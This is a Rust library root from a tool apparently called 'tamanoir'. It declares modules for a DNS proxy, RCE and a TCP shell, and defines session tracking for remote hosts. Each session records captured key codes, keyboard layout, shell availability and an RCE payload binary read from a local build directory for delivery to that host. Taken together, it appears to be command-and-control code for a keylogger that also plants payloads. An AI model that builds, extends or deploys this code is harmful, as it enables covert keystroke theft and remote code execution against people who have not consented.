pub mod cli;
pub mod dns_proxy;
pub mod grpc;
pub mod rce;
pub mod tcp_shell;

pub mod tamanoir_grpc {
    tonic::include_proto!("tamanoir");
}

use std::{
    collections::HashMap,
    fs,
    net::{Ipv4Addr, SocketAddr},
    sync::Arc,
};

use chrono::{DateTime, Utc};
use home::home_dir;
use serde::Deserialize;
use tamanoir_common::{Layout, TargetArch};
use tokio::sync::{
    broadcast::{self, Sender},
    Mutex,
};
const AR_COUNT_OFFSET: usize = 10;
const AR_HEADER_LEN: usize = 12;
const FOOTER_TXT: &str = "r10n4m4t/";
const FOOTER_EXTRA_BYTES: usize = 3;
const FOOTER_LEN: usize = FOOTER_TXT.len() + FOOTER_EXTRA_BYTES;

#[derive(Debug, Deserialize, Clone)]
pub struct SessionRcePayload {
    name: String,
    target_arch: TargetArch,
    length: usize,
    buffer: Vec<u8>,
}
#[derive(Debug, Clone)]
pub struct Session {
    pub ip: Ipv4Addr,
    pub key_codes: Vec<u8>,
    pub rce_payload: Option<SessionRcePayload>,
    pub first_packet: DateTime<Utc>,
    pub latest_packet: DateTime<Utc>,
    pub n_packets: usize,
    pub keyboard_layout: Layout,
    pub arch: TargetArch,
    pub shell_availability: bool,
}
impl Session {
    pub fn new(sock_addr: SocketAddr, arch: TargetArch) -> Option<Self> {
        let now_utc = Utc::now();
        match sock_addr {
            SocketAddr::V4(addr) => Some(Session {
                ip: *addr.ip(),
                key_codes: vec![],
                rce_payload: None,
                first_packet: now_utc,
                latest_packet: now_utc,
                n_packets: 1,
                keyboard_layout: Layout::Azerty,
                arch,
                shell_availability: false,
            }),
            _ => None,
        }
    }
    pub fn reset_rce_payload(&mut self) {
        self.rce_payload = None;
    }
    pub fn set_rce_payload(&mut self, rce: &str, target_arch: TargetArch) -> Result<(), String> {
        if self.rce_payload.is_some() {
            return Err(format!(
                "An rce payload already exists for session {}",
                self.ip
            ));
        }
        match target_arch {
            TargetArch::X86_64 => {
                let mut build_dir = home_dir().unwrap();
                build_dir.push(".tamanoir/bins");

                let bin_name = format!("tamanoir-rce-{}_x86_64.bin", rce);

                let data: Vec<u8> = fs::read(build_dir.join(bin_name)).map_err(|_| {
                    format!(
                        "rce {} not found in build directory, you may need to (re)build it",
                        rce
                    )
                })?;
                self.rce_payload = Some(SessionRcePayload {
                    name: rce.into(),
                    target_arch: TargetArch::X86_64,
                    length: data.len(),
                    buffer: data,
                });
                Ok(())
            }
            _ => Err(format!("target arch {:#?} unavailable", target_arch)),
        }
    }
    pub fn set_layout(&mut self, layout: Layout) {
        self.keyboard_layout = layout
    }
    pub fn set_shell_availibility(&mut self, availibility: bool) {
        self.shell_availability = availibility;
    }
}

#[derive(Debug, Deserialize)]
struct CargoMetadata {
    package: Option<PackageMetadata>,
}

#[derive(Debug, Deserialize)]
struct PackageMetadata {
    name: String,
}

type SessionsState = Arc<Mutex<HashMap<Ipv4Addr, Session>>>;
type SessionsStateWatcher = Arc<Sender<Session>>;
#[derive(Clone)]
pub struct SessionsStore {
    pub sessions: SessionsState,
    pub tx: SessionsStateWatcher,
}
impl Default for SessionsStore {
    fn default() -> Self {
        Self::new()
    }
}

impl SessionsStore {
    pub fn new() -> Self {
        let (tx, _) = broadcast::channel(16);
        Self {
            sessions: Arc::new(Mutex::new(HashMap::new())),
            tx: Arc::new(tx),
        }
    }
    pub fn notify_update(&self, session: Session) -> anyhow::Result<()> {
        if self.tx.receiver_count() > 0 {
            self.tx.send(session)?;
        }
        Ok(())
    }
}
